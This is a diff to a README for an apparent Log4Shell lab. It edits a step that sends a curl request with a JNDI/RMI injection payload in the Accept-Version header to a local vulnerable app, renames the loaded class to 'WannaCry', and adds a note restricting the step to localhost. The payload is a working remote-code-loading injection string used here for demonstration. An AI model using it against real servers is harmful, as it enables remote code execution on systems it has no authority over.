@@ -61,11 +61,12 @@ The original website is returned.
 
 ```bash
 
-curl 'http://localhost:8080/hello' --header 'Accept-Version: ${jndi:rmi://127.0.0.1:1099/ExecByEL}'
+curl 'http://localhost:8080/hello' --header 'Accept-Version: ${jndi:rmi://127.0.0.1:1099/WannaCry}'
 ```
 
-The website at  vulnerabel_log4j_app/web gets updated with the site from Log4jshell_rmi_server/web.
+The website at vulnerabel_log4j_app/web gets updated with the site from Log4jshell_rmi_server/web
 
+Note: to protect against real exploitation, this must be done from a client located at 127.0.0.1.
 
 ### 6. Get the malicious site from vulnerabel_log4j_app/web
 
